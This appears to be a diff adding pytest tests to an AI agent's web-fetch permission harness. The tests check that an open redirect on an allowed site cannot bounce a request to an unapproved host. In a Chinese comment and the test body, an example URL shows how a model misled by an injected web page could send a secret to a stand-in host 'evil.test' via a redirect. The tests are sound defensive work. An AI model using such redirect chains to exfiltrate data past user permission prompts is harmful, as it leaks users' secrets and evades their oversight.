@@ -17,6 +17,7 @@ from __future__ import annotations
 
 import json
 from types import SimpleNamespace
+from urllib.parse import parse_qs, quote, urlsplit
 
 import openai
 import pytest
@@ -28,6 +29,7 @@ from fetch_rig import FakeSite, fetcher, page, redirect
 from harness import capabilities, rewind
 from harness.agents import tools as agent_tools
 from harness.app import build_app
+from harness.fetch import guard
 from harness.fetch.session import FetchSession
 from harness.permissions import Permissions, review_fetch
 from harness.tools import fetch as fetch_tool
@@ -222,6 +224,43 @@ def test_same_site_redirect_counts_as_read(site):
     site.routes["/away"] = redirect(site.url("/home", host="elsewhere.test"))
     made.tool.run({"url": site.url("/away")})
     assert made.tool.look({"url": site.url("/home", host="elsewhere.test")}).new_site is True
+
+
+def _open_redirect(handler) -> None:
+    """一个"开放跳转"：/go?to=任何网址 就跳过去。很多网站都有（登录以后回到哪儿、外链的中转页）。"""
+    target = parse_qs(urlsplit(handler.path).query).get("to", [""])[0]
+    handler.send_response(302)
+    handler.send_header("Location", target)
+    handler.send_header("Content-Length", "0")
+    handler.send_header("Connection", "close")
+    handler.end_headers()
+
+
+def test_an_allowed_site_cannot_bounce_the_fetch_to_a_site_you_never_allowed(site, permissions):
+    # 你允许过 site.test。被网页带偏的模型之后读 site.test/go?to=http://evil.test/collect?data=秘密：同一个网站，不再问你，
+    # 可 site.test 把它原样跳到 evil.test，秘密就到了一个你从没允许过的网站手里（卡片上一次都没出现过它）
+    site.routes["/"] = page("<p>首页</p>")
+    site.routes["/go"] = _open_redirect
+    site.routes["/collect"] = page("<p>收到了</p>")
+    made = make_tool(fetcher("site.test", "evil.test"))
+    made.tool.run({"url": site.url("/")})  # 第一次读 site.test（假设你点了允许）
+    evil = site.url("/collect?data=secret", host="evil.test")
+    bounce = site.url("/go?to=" + quote(evil, safe=""))
+    assert permissions.review("web_fetch", {"url": bounce}, made.tool) is None  # 同一个网站：不再问
+    result = made.tool.run({"url": bounce})
+    hosts = [request["headers"]["host"].split(":")[0] for request in site.requests]
+    assert "evil.test" not in hosts  # evil.test 一个字节都没收到
+    assert evil in result and "web_fetch" in result  # 告诉模型跳到了哪儿、要读它得自己再调用一次
+    assert permissions.review("web_fetch", {"url": evil}, made.tool) is not None  # 那时照常先问你
+
+
+def test_a_redirect_to_a_site_already_allowed_is_followed(site):
+    site.routes["/go"] = _open_redirect
+    site.routes["/collect"] = page("<p>收到了</p>")
+    made = make_tool(fetcher("site.test", "other.test"))
+    made.session.allow(guard.site_of(site.url("/", host="other.test")))  # 这段对话里允许过 other.test
+    result = made.tool.run({"url": site.url("/go?to=" + quote(site.url("/collect", host="other.test"), safe=""))})
+    assert "收到了" in result
 
 
 @pytest.mark.parametrize(("mode", "asked"), [("ask", True), ("readonly", True), ("edits", True), ("all", False)])
